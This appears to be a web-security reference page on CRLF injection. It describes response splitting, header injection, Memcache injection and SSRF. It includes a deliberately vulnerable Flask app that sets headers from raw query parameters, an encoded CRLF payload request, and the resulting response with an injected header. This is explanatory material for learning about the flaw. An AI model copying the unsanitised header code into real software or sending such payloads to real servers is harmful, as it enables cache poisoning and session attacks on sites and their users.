CRLF injection is a vulnerability where an attacker manages to inject a CRLF sequence (carriage return and line feed) into the response, allowing them to manipulate the response body and/or headers.

CRLF injection attacks include:

- **HTTP Response Splitting** 

An attack where an attacker inserts CRLF sequences into user input, aiming to manipulate the HTTP response generated by the web application. This can lead to various consequences, such as injecting malicious content or crafting misleading responses.
 
- **HTTP Header Injection** 

Involves injecting CRLF sequences into HTTP headers. This attack can lead to security issues, allowing an attacker to add or modify headers, potentially leading to cache poisoning, session fixation, or other forms of web application compromise.
 
- **Memcache Injection**

A type of CRLF attack that targets systems utilizing Memcached, a distributed memory caching system. Attackers inject CRLF sequences to manipulate the content stored in Memcached, possibly leading to cache poisoning, information disclosure, or denial of service.

- **Server-Side Request Forgery:** 

A broader attack that sometimes involves CRLF injection. In this scenario, an attacker tricks the server into making requests to internal resources by injecting malicious input containing CRLF sequences. The attacker may exploit this to access sensitive information, pivot through internal systems, or perform unauthorized actions on behalf of the server.


=== "Python"
  ```python
  import flask
  from flask import request
  from flask import make_response
  
  app = flask.Flask(__name__)
  
  @app.route("/")
  def index():
      header = request.args.get("header")
      username = request.args.get("username")
      resp = make_response("Hello: %s" % username)
      resp.headers.set(header, username)
      return resp
  
  app.run(host="0.0.0.0", port=8080)
  ```

=== "Request"
  ```http
  GET /?header=GET%20/?name=A:a%0a%0dA:d%0d%0d%0a%0dInjected-Header&username=abc HTTP/1.1
  Host: localhost
  User-Agent: Mozilla/5.0
  Referrer: http://localhost/
  ```

=== "Response"
  ```http
  HTTP/1.1 200 OK
  Server: Werkzeug/2.3.7 Python/3.10.12
  Date: Tue, 09 Jan 2024 11:03:05 GMT
  Content-Type: text/html; charset=utf-8
  Content-Length: 10
  GET /?name=A:a
  
  A:d
  
  
  Injected-Header: abc
  Connection: close
  
  Hello: abc
  ```